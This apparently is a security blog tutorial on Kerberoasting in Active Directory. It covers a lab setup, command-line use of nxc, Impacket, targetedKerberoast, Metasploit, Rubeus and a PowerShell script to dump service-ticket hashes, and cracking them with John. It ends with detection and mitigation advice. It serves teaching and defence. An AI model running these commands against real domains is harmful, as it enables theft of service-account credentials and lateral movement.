<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Kerberoasting Attack in Active Directory</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/kerberoasting-attack-in-active-directory/" rel="bookmark"><time class="entry-date published" datetime="2025-07-11T12:29:07+00:00">July 11, 2025</time><time class="updated" datetime="2025-07-11T12:43:22+00:00">July 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This article explores Kerberoasting, a stealthy attack in Active Directory that exploits Service Principal Names (SPNs) to extract and crack TGS ticket hashes, revealing service account passwords. Unlike AS-REP Roasting, it abuses legitimate Kerberos requests. The post details lab setup, exploitation using Impacket, Rubeus, and NXC, and maps the attack to MITRE ATT&amp;CK T1558.003. It also covers detection (Event ID 4769), AES enforcement, and mitigation strategies to defend against this threat.</span></p>
<h3><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li><span style="color: #000000;">Kerb-roasting Walkthrough</span></li>
<li><span style="color: #000000;">Prerequisites</span></li>
<li><span style="color: #000000;">Lab Setup</span></li>
</ul>
<p><span style="color: #000000;"><strong>Method for Exploitation – Kerberoasting Attack (T1558.003)</strong></span></p>
<ul>
<li><span style="color: #000000;">Nxc</span></li>
<li><span style="color: #000000;">Impacket-GetNPUsers</span></li>
<li><span style="color: #000000;">targetedKerberoast</span></li>
<li><span style="color: #000000;">Metasploit</span></li>
<li><span style="color: #000000;">Rubeus</span></li>
<li><span style="color: #000000;">Windows PowerShell – Kerberoast</span></li>
</ul>
<p><span style="color: #000000;"><strong>Detection &amp; Mitigation</strong></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Kerb-roasting Walkthrough</span> </span></h3>
<p><span style="color: #000000;"><strong>Step 1: Attacker Gains Access to the Domain</strong></span></p>
<p><span style="color: #000000;">The attacker first logs into the domain using a valid low-privileged user account. No special permissions or admin access is needed—just any domain user account will do.</span></p>
<p><span style="color: #000000;"><strong>Step 2: Enumerate SPNs (Service Principal Names)</strong></span></p>
<p><span style="color: #000000;">The attacker scans the domain to find service accounts that have SPNs associated with them.</span></p>
<p><span style="color: #000000;">These SPNs represent services running on the network—like SQL, HTTP, etc.—and are tied to domain accounts.</span></p>
<p><span style="color: #000000;"><strong>Step 3: Request TGS for the SPN</strong></span></p>
<p><span style="color: #000000;">Once the attacker finds SPNs, they request a Ticket Granting Service (TGS) ticket from the Domain Controller (KDC) for those services.</span></p>
<p><span style="color: #000000;">These tickets are encrypted using the NTLM hash of the service account’s password.</span></p>
<p><span style="color: #000000;">The attacker does not need the password to request the ticket—just the SPN.</span></p>
<p><span style="color: #000000;"><strong>Step 4: Extract the TGS Ticket</strong></span></p>
<p><span style="color: #000000;">The attacker extracts the TGS ticket from memory or directly using tools.</span></p>
<p><span style="color: #000000;"><strong>Step 5: Crack the TGS Ticket Offline</strong></span></p>
<p><span style="color: #000000;">The encrypted TGS ticket is now cracked offline, using tools like: hashcat, john the ripper</span></p>
<p><span style="color: #000000;">The attacker runs a brute-force or dictionary attack to recover the plaintext password of the service account.</span></p>
<p><span style="color: #000000;">Since the ticket is encrypted with the account’s hash, cracking the ticket = getting the password.</span></p>
<p><span style="color: #000000;"><strong>Step 6: Use the Cracked Password</strong></span></p>
<p><span style="color: #000000;">If successful, the attacker now has credentials of the service account.</span></p>
<p><span style="color: #000000;">Many service accounts have high privileges (like local admin or even domain admin), or can be used to move laterally, access databases, or escalate privileges.</span></p>
<h3><span style="color: #800000;">Prerequisites</span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory</span></li>
<li><span style="color: #000000;">Kali Linux</span></li>
<li><span style="color: #000000;">Tools: Impacket, Metasploit, nxc, targetedKerberoast, Rubeus, Poweshell</span></li>
<li><span style="color: #000000;">Windows 10/11 – As Client</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">In this lab setup, we will assign an SPN to a service account, setting the stage for a kerberoasting attack simulation.</span></p>
<h4><span style="color: #800000;"><strong>Create the AD Environment:</strong></span></h4>
<p><span style="color: #000000;">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
<h5><span style="color: #000000;"><strong>Domain Controller</strong>:</span></h5>
<ul>
<li><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended).</span></li>
<li><span style="color: #000000;">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
<li><span style="color: #000000;">Set up the domain (e.g., <strong>local</strong>).</span></li>
</ul>
<h5><span style="color: #000000;"><strong>Create a Service Account with SPN</strong>:</span></h5>
<p><span style="color: #000000;">On the <strong>Domain Controller</strong> (DC), use <strong>setspn</strong> to assign an SPN to the user <strong>raj</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">setspn -a hackingarticles/dc.ignite.local ignite.local\raj</pre>
<ul>
<li><span style="color: #000000;"><strong>-a</strong> adds an SPN to the user.</span></li>
<li><span style="color: #000000;"><strong>hackingarticles/dc.ignite.local</strong> is the SPN.</span></li>
<li><span style="color: #000000;"><strong>local\raj</strong> is the service account.</span></li>
</ul>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiv_YrAeUIl-AG_Gw7A5YAhRV31Jwl87B5ioxUQ0aN848f_9dzZU6Ms6wtBm4JSMBpL3CKGD_52z2vDCi21vz3oN8S9Kb1zyAJHuq6I02Gyw8dvjxNFSNi53-yt0-g8-Eufg3TZUNcUjlFO4XHBFa1CJdraYmVd6dFM9ntuCAHZIpsi1tXIH12eqJ-qR6mc/s16000/0.png" alt="Kerberoasting Attack in Active Directory" width="713" height="91"/></span></p>
<h3><span style="color: #800000;">Method for Exploitation – Kerberoasting Attack (T1558.003)</span></h3>
<p><span style="color: #000000;">Attackers (in this case, the <strong>Aarti</strong> user) can exploit service accounts with SPNs by requesting Kerberos service tickets (TGS) that the account’s NTLM hash encrypts. They can then crack these tickets offline to recover plaintext credentials.</span></p>
<h4><span style="color: #800000;">NXC</span></h4>
<p><span style="color: #000000;">NXC (formerly CrackMapExec) can perform Kerberoasting efficiently.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.53 -u aarti -p Password@1 --kerberoasting hash.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOB1hViSctWeeqFdGbwSxn3KVIE5N7UBfo0Nvm5aJ1aP44zwsGT2lYqpGLm8Tse5JManKReJ1bANSi5oOuaENZcSKOqO2n3wHeLBVg5ZLg6yTVvviFLp_tzxyCgadQ9WMoQ4xHU2EacQRvIyLclLfoQZgnaFpaMZ3IWqd3iHWRzXU4CkVWENkBdAtqKujt/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Further, with the help of John the Ripper and a dictionary such as Rock You can help the attacker to brute force the weak password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt hash.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghbZIgfhmDm5Od70aHenGloBGTEOu1sGnRYo8RehsiZkE-Ul_jL2kti_r37skDNhEeFpSieKRQ-HZj5IazTPa5bicGksSa7x_NJsQX8DqSOAbUjqU_w_exulqpcnUpJg9uAXTjP5Y0g-5j-QEHsNg33rgKXdvYPSXZp9buqAtWu3wTYif4JJ_BJKbhvSaG/s16000/2.png"/></span></p>
<h4><span style="color: #800000;">Impacket-GetNPUsers</span></h4>
<p><span style="color: #000000;">Use Impacket inbuilt module “GetUSerSPNs.py”, it is a python script that it discovers SPN, extract TGS and dump service Hash, this can be done with the help of the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetUserSPNs -request -dc-ip 192.168.1.53 ignite.local/aarti:Password@1</pre>
<p><span style="color: #000000;">Then, it will dump the service hash and with the help of the dictionary, you can brute force it for extracting service passwords.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoq9AWYSCwjRq-M3lFZ4CPC_qBU-_TlkjSzeovzqvwNv9xUU_OxRd0EqrmGBnAE0_Q-dPIR2K_vvJgxtHuIsS51LHnIuzTv1IgxlEaJP_CBOvOw5Zi0ZVcZnC7-FvdKri5kvsloXN3gBssuZ6CaTOkMTlPArJNtbGz6S5lB7MR7AD8J2pJ_Y95HYXUIvid/s16000/3.png" alt="Kerberoasting Attack in Active Directory" width="827" height="404"/></span></p>
<h4><span style="color: #800000;">targetedKerberoast</span></h4>
<p><span style="color: #000000;">targetedKerberoast is a Python script that can print “kerberoast” hashes for user accounts that have a SPN set.</span></p>
<p><span style="color: #000000;">Clone the repository and install:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjaHyzzqW3z3GRaKFvZ60ZZCD6Y0lBj97PgRTMRLk_KtTBnr6A2tmvnQPXHOcfTLSF_089nkJ5xdQ5G1b7BMxeeAeUPqnh_S8JMiEtnweE1IwCAOM93hFErjBZmP8OzdSiJDZkdxqL6OzofDw27lCETWUE9p4YoM4c39P5jyv3kU-rJ7KOjH6085-4109vQ/s16000/4.png"/></strong></span></p>
<p><span style="color: #000000;">Run the attack:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./targetedKerberoast.py --dc-ip '192.168.1.53' -v -d 'ignite.local' -u 'aarti' -p 'Password@1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPel5QadnX2qZ4i7Y1JE0-vEgVG8SNo5JkthM8FgKFYB5nyc3hk8I-jkYppVEDB5CZjaYVVHHs1pfDmWu-mQkrE7Qt63Kq3JhrtiXLzxntpgHKpojBrrAz46JcPMJpb_LtNccg3feP_V-Z-XkpyFS061ZHKNk81TFCY5NaEUfrLD1Y-Ehlu5AJCHjFe56d/s16000/5.png"/></span></p>
<h4><span style="color: #800000;">Metasploit</span></h4>
<p><span style="color: #000000;">The easiest way to enumerate Kerberoastable accounts is with the auxiliary/gather/get_user_spns module which internally leverages Impacket. This module will automatically query LDAP for Kerberoastable SPNs and request a Kerberos service ticket that may be encrypted using the weak password which can be bruteforced:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/get_user_spns
set rhosts 192.168.1.53
set domain ignite.local
set user aarti
set pass Password@1
run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglAof6ytr45IMta-meLg_0iPDFFUqAWGYrcb5g385CNLmc5NrmLuRTAPspChXmlFgD-3sQDd8_YkRfPJfmIn_c_pG7WgPXyWfzDwFT-_h5ZdLJqztJfij_0zEdN0TyiptKXPxADhqlhKggpbDEViBej0VyyD-W0iQdiETot3Jp5CxYZ6dcj8YOkj-OT-fk/s16000/6.png" alt="Kerberoasting Attack in Active Directory" width="676" height="480"/></strong></span></p>
<p><span style="color: #000000;"><strong>Windows</strong></span></p>
<h4><span style="color: #800000;">Rubeus</span></h4>
<p><span style="color: #000000;">Rubeus.exe is a terrific tool as it comes with a kerberoast module that discovers SPN, extracts TGS, and dump service Hash, which can be done with the help of the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./Rubeus.exe kerberoast /outfile:hash.txt</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQxEBXaA-p5MkBH170-O5gkTKbYhP9T8IGRr0659MBPqBB56t4WRS-sVGbNf2riv7P7SzdI06uRJYwL_o__MIuoV-w3JIH-M8o8vxrMb74LOGvOMFsTmLWJMzZuIGl58L_M_tvN0qaEqJiT-s0A74M7Ktd3MMFxapSm4mCVl2OKhcnrlQMuJEEE0Lacykq/s16000/50.png"/></strong></span></p>
<h4><span style="color: #800000;">Windows PowerShell – Kerberoast</span></h4>
<p><span style="color: #000000;">You can download <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Kerberoast.ps1</a></span>, a PowerShell script that is similar to the above module; it discovers the SPN, extracts TGS, and dumps the service hash. You can do this with the help of the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Powershell -ep bypass
Import-Module .\Invoke-kerberoast.ps1
Invoke-kerberoast</pre>
<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKySNpsQoWvCcM609X5cA8dS8KqYtfX5Q2pUoPavuUIaucCNlUviJU1uH8Nqxk3SmZHdW0fFd8CJp4k8aUUvrEjFlHY1UYKms4KVFRd7leM29vANy7RKE_ZvhbJdu7guiHsG5_nwtNGQWXMUoN7RF_lsvb26amqldybdhnicuUSgooRqhpvVZoF_CufI4Q/s16000/51.png" alt="Kerberoasting Attack in Active Directory" width="585" height="347"/></strong></span></p>
<h3><span style="color: #800000;">Detection &amp; Mitigation</span></h3>
<h4><span style="color: #800000;">Detection</span></h4>
<p><span style="color: #000000;">Detecting Kerberoasting is crucial because attackers silently request service tickets, which they can later crack offline.</span></p>
<p><span style="color: #000000;"><strong>Key Windows Event ID: 4769</strong></span></p>
<p><span style="color: #000000;">Detecting Kerberoasting is crucial because attackers silently request service tickets, which they can later crack offline.</span></p>
<p><span style="color: #000000;">What to Look for in Event ID 4769:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Ticket Encryption Type:</strong> Often 0x17 (RC4) — the easiest to crack.</span></li>
<li><span style="color: #000000;"><strong>Account Name:</strong> Look for unusual service account names or high-value users.</span></li>
<li><span style="color: #000000;"><strong>Service Name (SPN):</strong> Identify rare or high-privilege SPNs that shouldn’t be accessed frequently.</span></li>
<li><span style="color: #000000;"><strong>Client Address:</strong> If TGS requests come from non-privileged or unusual machines/users, it may be suspicious.</span></li>
</ul>
<p><span style="color: #000000;">These indicators may suggest Kerberoasting activity, especially if seen from low-privileged accounts requesting tickets for service accounts.</span></p>
<h4><span style="color: #800000;">Mitigation</span></h4>
<p><span style="color: #000000;">Protecting your Active Directory environment from Kerberoasting involves improving password hygiene, SPN configuration, and monitoring.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Use Strong, Complex Passwords:</strong> Ensure service accounts (especially those with SPNs) use long, random, and unique passwords. Avoid reusing passwords or using dictionary words.</span></li>
<li><span style="color: #000000;"><strong>Rotate Passwords Regularly:</strong> Implement scheduled password changes for service accounts — especially those tied to SPNs.</span></li>
<li><span style="color: #000000;"><strong>Use Managed Service Accounts (gMSA):</strong> These accounts automatically handle complex password management and rotation, significantly reducing risk.</span></li>
<li><span style="color: #000000;"><strong>Avoid Using Highly Privileged Accounts for Services: </strong>Don’t assign SPNs to Domain Admins or other privileged accounts. Use separate, least-privilege accounts for services.</span></li>
<li><span style="color: #000000;"><strong>Disable RC4 Encryption:</strong> Enforce stronger encryption (AES128: 0x11, AES256: 0x12) via Group Policy:</span></li>
<li><span style="color: #000000;"><strong>Monitor Event ID 4769 Regularly:</strong> Use SIEM tools or scripts to alert on unusual TGS requests.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact</span> <a href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
